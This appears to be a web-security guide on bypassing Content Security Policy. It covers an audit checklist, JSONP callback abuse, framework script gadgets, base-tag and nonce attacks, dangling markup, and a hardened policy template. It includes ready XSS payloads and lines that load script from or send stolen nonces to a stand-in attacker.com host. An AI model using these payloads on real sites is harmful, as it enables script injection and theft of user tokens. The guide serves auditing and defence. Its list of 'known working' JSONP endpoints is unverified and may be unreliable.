# 04 — Content Security Policy Bypass

## Overview

CSP is the primary browser-level defense against XSS injection. However, common misconfigurations and trusted-domain allowlists provide attack surfaces even when a policy is present. This document covers audit methodology, bypass techniques, and a strong policy template.

---

## 1. CSP Audit Checklist

Before looking for bypasses, enumerate misconfigurations:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' cdn.example.com;
```

| Directive | Issue | Risk |
|-----------|-------|------|
| `'unsafe-inline'` | Allows inline `<script>` and event handlers | Critical — policy largely useless for XSS |
| `'unsafe-eval'` | Allows `eval()`, `Function()`, `setTimeout(string)` | High |
| `*` wildcard | Any host can serve scripts | Critical |
| Missing `base-uri` | Base tag injection possible | High |
| Missing `object-src` | Plugin-based execution (Flash, Java) | Medium |
| Missing `require-trusted-types-for` | DOM sinks unprotected against Trusted Types | Medium |

> **Important:** `'unsafe-inline'` already being present is a misconfiguration, not a bypass target. Techniques in this document apply to policies that *do not* include `'unsafe-inline'`.

---

## 2. JSONP Endpoint Abuse

If a whitelisted domain exposes a JSONP endpoint, the `callback` parameter becomes arbitrary JavaScript executed under that origin:

```
CSP: script-src https://apis.google.com
```

```html
<script src="https://apis.google.com/jsonp?callback=alert(1)//"></script>
```

The `//` comments out any trailing content that the endpoint appends after the callback invocation.

**Finding JSONP endpoints:**

```bash
# Search known JSONP endpoint databases
# JSONBee: https://github.com/zigoo0/JSONBee
curl "https://TARGET_WHITELISTED_DOMAIN/api?callback=test"
# Look for: test({"key":"value"}); in the response
```

Known working JSONP endpoints (verify before use — endpoints change):

| Domain | Endpoint |
|--------|----------|
| `accounts.google.com` | `/o/oauth2/revoke?callback=` |
| `googletagmanager.com` | `/gtm.js?id=GTM-XXXX&callback=` |
| `facebook.com` | `/plugins/like.php?callback=` (historical) |

---

## 3. Script Gadgets

Whitelisted libraries often contain code patterns that can be repurposed to execute arbitrary JavaScript without injecting new `<script>` tags.

### Angular 1.x Template Injection (< 1.6)

```
CSP: script-src 'self' ajax.googleapis.com
```

```html
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.11/angular.min.js"></script>
```

Angular 1.x evaluated template expressions in scope. `constructor.constructor` reaches `Function`, allowing arbitrary code execution. Angular 1.6+ hardened the sandbox; use `$eval` escalation chains for those versions.

### jQuery `.html()` Gadget

```javascript
// If trusted code does:
$('#output').html(userControlledVar);
// And userControlledVar flows from an attacker-controlled source (e.g., URL parameter),
// jQuery parses and executes inline event handlers.
```

```html
<!-- Payload value for userControlledVar -->
<img src=x onerror=alert(1)>
```

### Lodash Template Gadget (< 4.17.21)

```javascript
// If application uses lodash template with user input:
_.template('<%= userInput %>')();
// Lodash template compiles to a Function() call internally
```

---

## 4. Base Tag Injection

If `base-uri` is not set in the CSP, injecting a `<base>` tag redirects all relative resource loads:

```html
<!-- Inject this if base-uri is absent from CSP -->
<base href="https://attacker.com/">

<!-- All subsequent relative <script src="app.js"> load from attacker.com/app.js -->
<script src="app.js"></script>
```

Fix: always include `base-uri 'none'` or `base-uri 'self'` in the CSP.

---

## 5. Nonce Reuse and Prediction

CSP nonces must be cryptographically random and unique per response. Vulnerabilities arise when:

- Nonces are static (same nonce across all responses)
- Nonces are predictable (sequential, timestamp-based)
- Caching serves the same nonced response to multiple users
- Nonces are reflected in other observable locations (URLs, error messages)

```
CSP: script-src 'nonce-abc123'
```

```html
<!-- If nonce is known or predicted: -->
<script nonce="abc123">alert(1)</script>
```

---

## 6. Dangling Markup Injection

When script execution is blocked but HTML injection is possible, exfiltrate nonces or CSRF tokens by injecting unclosed attribute values:

```html
<!-- Inject this into a page that contains <script nonce="SECRET"> below the injection point -->
<img src="https://attacker.com/steal?data=

<!-- Browser constructs the src value by consuming everything up to the next " character -->
<!-- The nonce value is sent to attacker.com as a query parameter -->
```

---

## 7. `strict-dynamic` Propagation

With `strict-dynamic`, scripts loaded by a nonce-bearing script inherit its trust. If an attacker can influence a trusted script's behavior (e.g., via a DOM-based open redirect or prototype pollution):

```javascript
// Trusted nonced script creates a child script — child inherits trust
const s = document.createElement('script');
s.src = 'https://attacker.com/evil.js';
document.head.appendChild(s);
```

`strict-dynamic` does *not* propagate trust to `data:` or `blob:` URLs in current browsers.

---

## 8. Strong CSP Template

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{RANDOM_PER_REQUEST}' 'strict-dynamic';
  style-src 'nonce-{RANDOM_PER_REQUEST}';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  object-src 'none';
  require-trusted-types-for 'script';
```

---

## Tools

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/) — Google's static CSP analyzer
- [JSONBee](https://github.com/zigoo0/JSONBee) — JSONP endpoints database
- [CSP Scanner Burp Extension](https://portswigger.net/bappstore/35f00e7b4b4d4b7f8a5c4b5d5e5c5b5a) — inline CSP analysis during proxying

---

## References

- [Bypassing CSP with Script Gadgets — Lekies, Kotowicz, Groß](https://research.google/pubs/pub45542/)
- [PortSwigger CSP Bypass Research](https://portswigger.net/research/bypassing-csp-with-policy-injection)
- [W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [JSONBee JSONP Endpoint Database](https://github.com/zigoo0/JSONBee)
